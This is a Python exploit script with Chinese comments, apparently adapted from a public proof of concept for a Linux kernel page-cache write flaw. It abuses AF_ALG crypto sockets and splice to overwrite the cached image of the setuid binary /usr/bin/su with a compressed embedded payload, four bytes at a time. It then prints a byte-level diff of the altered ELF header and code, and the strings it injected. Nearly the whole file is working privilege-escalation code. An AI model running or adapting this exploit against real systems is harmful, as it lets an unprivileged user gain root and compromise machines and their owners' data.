#!/usr/bin/env python3
# based on github.com/theori-io/copy-fail-CVE-2026-31431
import mmap
import os
import socket
import zlib

def d(x):
    return bytes.fromhex(x)

def ascii_repr(b):
    return ''.join(chr(c) if 0x20 <= c < 0x7f else '.' for c in b)

ELF_FIELD = {
    0x00: "e_ident",    0x10: "e_type",     0x12: "e_machine",
    0x14: "e_version",  0x18: "e_entry",    0x20: "e_phoff",
    0x28: "e_shoff",    0x30: "e_flags",    0x34: "e_ehsize",
    0x36: "e_phentsize",0x38: "e_phnum",    0x3a: "e_shentsize",
    0x3c: "e_shnum",    0x3e: "e_shstrndx",
}

def trigger(file_fd, offset, payload):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = offset + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + payload],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768
    )
    r, w = os.pipe()
    os.splice(file_fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except:
        0

# 打开 /usr/bin/su，创建 mmap 映射页缓存
f = os.open("/usr/bin/su", os.O_RDONLY)
size = os.path.getsize("/usr/bin/su")
m = mmap.mmap(f, size, mmap.MAP_SHARED, mmap.PROT_READ)

# 触发前：读取整个页缓存快照
m.seek(0)
before_all = m.read()

# 执行 exploit：逐 4 字节写入 payload
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

print(f"[+] /usr/bin/su size: {size} bytes")
print(f"[+] payload size: {len(e)} bytes")
print(f"[*] triggering copy_file_range writeback ...")

i = 0
while i < len(e):
    trigger(f, i, e[i:i+4])
    i += 4

# 触发后：重新读取页缓存快照
m.seek(0)
m.flush()  # 刷新 mmap 视图，确保看到最新页缓存
after_all = m.read()

# 收集变化区间
changes = []
for off in range(min(len(before_all), len(after_all))):
    if before_all[off] != after_all[off]:
        changes.append(off)

if not changes:
    print("    (no changes detected)")
else:
    # 按连续区间分组
    groups = []
    start = changes[0]
    end = changes[0]
    for off in changes[1:]:
        if off == end + 1:
            end = off
        else:
            groups.append((start, end))
            start = end = off
    groups.append((start, end))

    for g_start, g_end in groups:
        size = g_end - g_start + 1
        before_bytes = before_all[g_start:g_end+1]
        after_bytes = after_all[g_start:g_end+1]

        # 区间标题
        if g_start < 0x40:
            region = "ELF header"
        elif g_start < 0x200:
            region = ".text"
        else:
            region = "other"
        print(f"\n  [{g_start:#06x}~{g_end:#06x}] ({size} bytes) {region}:")

        # 逐字段打印（ELF 头区域内按字段分组）
        if g_start < 0x40:
            for off in range(g_start, g_end + 1):
                field = ELF_FIELD.get(off, "")
                if field:
                    b_bef = before_all[off:off+2]
                    b_aft = after_all[off:off+2]
                    # 尝试作为整数展示
                    v_bef = int.from_bytes(b_bef, 'little')
                    v_aft = int.from_bytes(b_aft, 'little')
                    print(f"    {field:16s} @ {off:#06x}: {v_bef:#06x} -> {v_aft:#06x}")
                else:
                    print(f"    {'':16s} @ {off:#06x}: {before_all[off]:02x} -> {after_all[off]:02x}")
        else:
            # 非 ELF 头区域：hex + ascii 行展示
            for i in range(0, size, 16):
                chunk_off = g_start + i
                chunk_end = min(i + 16, size)
                b_bef = before_all[chunk_off:chunk_off+chunk_end-i]
                b_aft = after_all[chunk_off:chunk_off+chunk_end-i]
                hex_bef = ' '.join(f'{x:02x}' for x in b_bef)
                hex_aft = ' '.join(f'{x:02x}' for x in b_aft)
                print(f"    {chunk_off:#06x}:  {hex_bef:<48s} | {ascii_repr(b_bef)}")
                print(f"           ->  {hex_aft:<48s} | {ascii_repr(b_aft)}")

    # 提取嵌入字符串
    print(f"\n[+] total bytes changed: {len(changes)}")
    # 扫描 payload 区域中的可读字符串
    changed_bytes = bytes(after_all[c] for c in changes)
    strs = []
    cur = b""
    for b in changed_bytes:
        if 0x20 <= b < 0x7f:
            cur += bytes([b])
        else:
            if len(cur) >= 4:
                strs.append(cur.decode())
            cur = b""
    if len(cur) >= 4:
        strs.append(cur.decode())
    if strs:
        print(f"[+] embedded strings: {', '.join(repr(s) for s in strs)}")

m.close()
os.close(f)
